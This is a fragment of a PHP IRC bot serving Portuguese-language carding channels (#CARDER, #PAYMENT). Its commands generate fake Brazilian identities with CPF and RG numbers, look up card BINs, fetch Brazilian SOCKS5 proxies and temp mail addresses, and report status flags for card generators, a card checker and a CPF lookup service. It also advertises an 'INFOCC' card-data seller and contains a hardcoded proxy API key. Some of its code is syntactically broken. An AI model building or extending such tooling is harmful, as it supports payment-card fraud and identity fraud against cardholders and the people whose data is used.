					fputs($socket, "MODE #CARDER +b ~t:60:*!*@".$hosttmp[1]."\n");

				}
				if ($eAndroUser == "AndroUser") {
					fputs($socket, "KICK #CARDER ".$nickCMD." :Nick AndroUser não permitido!\n");
					fputs($socket, "MODE #CARDER +b ~t:60:*!*@".$hosttmp[1]."\n");
				}
			}
		}
		// AUTOBAN NICKCHANGE (Guest & AndroUser)
		if(isset($ex[0]) && $ex[1] == "NICK"  && $nickGuestCHANGE) {
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$newnick = str_replace(":", "", $ex[2]);
			$eGuest = substr($newnick, 0, 5);
			$eAndroUser = substr($newnick, 0, 9);
			if ($eGuest == "Guest") {
				fputs($socket, "KICK #CARDER ".$newnick." :Nick Guest não permitido!\n");
			} elseif ($eAndroUser == "AndroUser") {
				fputs($socket, "KICK #CARDER ".$newnick." :Nick AndroUser não permitido!\n");
			}
		}
		// COMANDOS #BRAZIL
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#BRAZIL"){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			switch ($comando) {
			    case 'sro':
				$codRastreio = preg_replace('/\s+/', '', $ex[4]);
				if (isset($ex[4]) && strlen($codRastreio) == 13) {
					$codObjeto = rastreioEncomenda($ex[4]);
					$sroACAO = $codObjeto[0]['acao'];
					$sroDATA = $codObjeto[0]['dia']." - ".$codObjeto[0]['hora'];
					$sroLOCAL = $codObjeto[0]['local'];
                                        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
                                } else { fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → Insira o CODIGO DE RASTREIO para consulta ( Exemplo: !sro PT113178279BR )\n"); }
                                break;
			}
		}
		// COMANDOS #PAYMENT
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#PAYMENT"){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			switch ($comando) {
			    case tempmail:
				$tempMAIL = geraTempMail();
				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7temp-mail1.7org1]12 $tempMAIL \n");
			        break;
			    case dados:
				$dados = json_decode(GeraPessoa());
			        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
			        break;
			    case lookup:
				if ($comando == "lookup") {
				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
                                        fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
                                } else { fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
                                break;
			}
		}
		// COMANDOS #CARDER
		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG #CARDER :!dados
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && isset($ex[2])){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			switch ($comando) {
			    case 'vendas':
				fputs($socket, "NOTICE $nickCMD :11[VENDEDOR DE INFOCC] 3autorizado 5BOLSONARO71 14[1https://pastecode.xyz/view/raw/c990cecb14]\n");
			        break;
			}
		}
		// COMANDOS #CARDER
		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG #CARDER :!dados
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#CARDER"){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			switch ($comando) {
			    case 'comandos':
				fputs($socket, "PRIVMSG $ex[2] :05COMANDOS do Canal 01#CARDER 02[https://pastecode.xyz/view/raw/5d99e19f]\n");
			        break;
			    case 'regras':
				fputs($socket, "PRIVMSG $ex[2] :05REGRAS do Canal 01#CARDER 02[https://pastecode.xyz/view/raw/cb96b716]\n");
			        break;
			    case 'ajuda':
				fputs($socket, "PRIVMSG $ex[2] :05AJUDA e PERMISSÕES do Canal 01#CARDER 02[https://pastecode.xyz/view/raw/2d29c8d3]\n");
			        break;
			    case 'tempmail':
				$tempMAIL = geraTempMail();
				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7temp-mail1.7org1]12 $tempMAIL \n");
			        break;
			    case 'status':
				if($checkerGGBB) { $statusGGBB = "3HABILITADO"; } else { $statusGGBB = "4DESABILITADO"; }
				if($checkerGGELO) { $statusGGELO = "3HABILITADO"; } else { $statusGGELO = "4DESABILITADO"; }
				if($checkerFULL) { $statusFULL = "3HABILITADO"; } else { $statusFULL = "4DESABILITADO"; }
				if($consultaCADSUS) { $statusconsulta = "3HABILITADO"; } else { $statusconsulta = "4DESABILITADO"; }
				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] GERADAS BB [$statusGGBB] GERADAS ELO [$statusGGELO] CHECKER FULL [$statusFULL] CONSULTA NOME/CPF [$statusconsulta] \n");
			        break;
			    case 'bin':
				if (isset($ex[4]) && strlen(preg_replace('/\s+/', '', $ex[4])) >= 6) {
					$tempBIN = substr($ex[4], 0, 6);
					$dadosBIN = pegaBin($tempBIN);
					$jsonSCHEME = $dadosBIN[7];
					$jsonNAME = convertCountry($dadosBIN[6]);
					$jsonTYPE = $dadosBIN[8];
					$jsonBRAND = $dadosBIN[9];
					$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [BIN] $tempBIN [BANDEIRA] $jsonSCHEME [PAÍS] $jsonNAME [BANCO] $binBANCO [TIPO] $jsonTYPE [CATEGORIA] $jsonBRAND \n");
				} elseif (strlen($ex[4]) < 6) {
					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
				} else {
					fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
				}
			        break;
			    case 'ip':
				$meuIP = pegaIp();
				fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [IP] $meuIP \n");
			        break;
			    case 'version':
			        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → CheckNet IRC PHP7 BOT [VERSÃO] $version (BETA) ATUALIZADO [$release]\n");
			        break;
			    case 'dados':
				$dados = json_decode(GeraPessoa());
			        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
			        break;
			    case 'uname':
                                if($nickCMD == $master) {
                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [SHELL] $CPUdistro \n");
                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] 4USUARIO NÃO RECONHECIDO! \n"); }
                                break;
			    case 'uptime':
                                if($nickCMD == $master) {
					$SYSuptime = Uptime();
                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [UPTIME] $SYSuptime \n");
                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] 4USUARIO NÃO RECONHECIDO! \n"); }
                                break;
			    case 'lookup':
				if ($comando == "lookup") {
				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
                                break;
			    case 'sro':
				$codRastreio = preg_replace('/\s+/', '', $ex[4]);
				if (isset($ex[4]) && strlen($codRastreio) == 13) {
					$codObjeto = rastreioEncomenda($ex[4]);
					$sroACAO = $codObjeto[0]['acao'];
					$sroDATA = $codObjeto[0]['dia']." - ".$codObjeto[0]['hora'];
					$sroLOCAL = $codObjeto[0]['local'];
                                        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
                                } else { fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → Insira o CODIGO DE RASTREIO para consulta ( Exemplo: !sro PT113178279BR )\n"); }
                                break;
			}
			case 'proxy':
                $proxy_key = '5a1a1257-cf8a-4975-b2fb-f01f13a3d023';
              $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?coutry=BR&api_key='.$proxy_key.'&protocol=SOCKS5');
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              $output = curl_exec($ch);
              curl_close($ch);

    // DECODIFICANDO RESPOSTA EM JSON
    $jsonOUTPUT = json_decode($output, true);
    $proxy_ip = $jsonOUTPUT['ipPort'];
    $proxy_speed = $jsonOUTPUT['speed'];
    $proxy_pais = $jsonOUTPUT['country'];

    fputs($socket, "PRIVMSG #CARDER :02[$nickCMD] → 05[+] PROXY - IP » $proxy_ip 14[+] PAIS  » $proxy_pais 03[+] SPEED » $proxy_speed \n");
		}
	}
}
?>
